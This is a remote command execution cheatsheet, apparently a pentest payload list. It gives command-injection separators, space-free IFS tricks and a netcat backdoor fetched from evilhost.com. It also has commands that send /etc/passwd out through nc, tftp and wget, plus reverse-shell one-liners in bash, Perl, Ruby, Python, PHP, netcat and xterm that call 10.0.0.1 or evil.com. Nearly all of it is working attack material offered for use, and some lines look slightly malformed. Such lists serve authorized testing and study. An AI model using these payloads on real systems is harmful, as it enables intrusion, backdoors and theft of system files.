Remote Command Exec Cheatsheet

File notes

**source-disc-cmd-exec-traversal.fuzz.txt**
usage<br>
```GET /path/*payload*relative/path/to/target/file/```

**Executing Commands**
Seperating Commands<br>
``` blah;blah2 ```

PIPES<br>
``` blah ^ blah 2```

AND <br>
```blah && blah2```

OR<br>
```FAIL || X```

OR <br>
``` blah%0Dblah2%0Dblah3 ```

Backtick<br>
``` `blah` ```

Background <br>
``` `blah & blah2` ```

***Shell commands without spaces***
<b>Using Internal Field Separator (IFS)</b>
Test for cmd injection withouot spaces:<br>
``` sleep${IFS:0:1}20 ```<br>

Example netcat backdoor without spaces:<br>
``` {wget,http://evilhost.com/nc} ```<br>
``` {chmod,+x,./nc} ```<br>
``` {./nc,-l,-p,6666,-e,/bin/bash} ```<br>

<b>Shell Variables</b><br>
``` CMD=$'cat\x20/etc/passwd';$CMD ```

shell variable, increment through file one line at a time: <br>
increment the first +1 to retreive the entire file, line by line<br>
``` SP=$'\x20';cat$SP/etc/passwd|tail$SP-n+1|head$SP-n+1 ```

<b>$IFS</b>
DD-WRT exploit POC circa 2009<br>
``` http:///cgi-bin/;nc$IFS-l$IFS-p$IFS5555$IFS-e$IFS/bin/sh ```<br>
or <br>
``` cat$IFS/etc/passwd ```<br>
increment the first +1 to retreive the entire file, line by line<br>
cat$IFSSP/etc/passwd|tail$IFS-n+1|head$IFS-n+1

**Exfiltrating Files / Data**

FTP <br>
Make a new text file, and echo and then redirect to FTP

NC <br>
``` 'nc -e /bin/sh' ```

NC <br>
``` 'echo /etc/passwd  | nc host port' ```

TFTP <br>
``` 'echo put /etc/passwd | tftp host' ```

WGET: <br>
``` 'wget --post-file /etc/passwd' ```

**One-Liner Reverse Shells**
On the listener <br>
``` $ nc -l -p 8080 -vvv' ```

On the remote host...<br>
Bash:<br>
``` $ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 ```

``` $ exec 5<>/dev/tcp/evil.com/8080 ```<br>
``` $ cat <&5 | while read line; do $line 2>&5 >&5; done ```

Perl<br>
```$ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' ```

Ruby<br>
``` $ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ```

Python<br>
``` $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ```

PHP<br>
``` $ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");' ```
(Assumes TCP uses file descriptor 3. It it doesn't work, try 4,5, or 6)

Netcat<br>
``` $ nc -e /bin/sh 10.0.0.1 1234 ```

``` $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f ```


XTERM:<br>
Server: <br>
```$ xterm -display 10.0.0.1:1```
Listener:<br>
```$ Xnest :1```
```$ xhost +targetip```


<br>More docs: /docs/attack-docs/remote-cmd-exfiltration/<br>
